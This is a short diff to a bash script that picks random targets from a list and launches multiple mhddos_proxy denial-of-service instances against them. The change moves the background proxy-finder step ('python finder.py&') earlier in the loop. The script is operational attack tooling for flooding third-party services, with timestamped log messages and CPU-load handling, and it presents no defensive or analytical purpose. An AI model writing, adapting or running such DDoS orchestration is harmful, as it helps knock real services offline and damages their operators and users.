@@ -141,6 +141,9 @@ do
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Number of targets in list: " $list_size "\n"
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Taking random targets (just not all) to reduce the load on your CPU(processor)..."
 	
+	cd ~/proxy_finder
+	python finder.py&
+	
    	if ((num_of_copies > list_size));
 	then 
 		random_numbers=$(shuf -i 1-$list_size -n $list_size)
@@ -150,8 +153,7 @@ do
 	
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
 	
-	cd ~/proxy_finder
-	python finder.py&
+	
       
    	# Launch multiple mhddos_proxy instances with different targets.
    	for i in $random_numbers
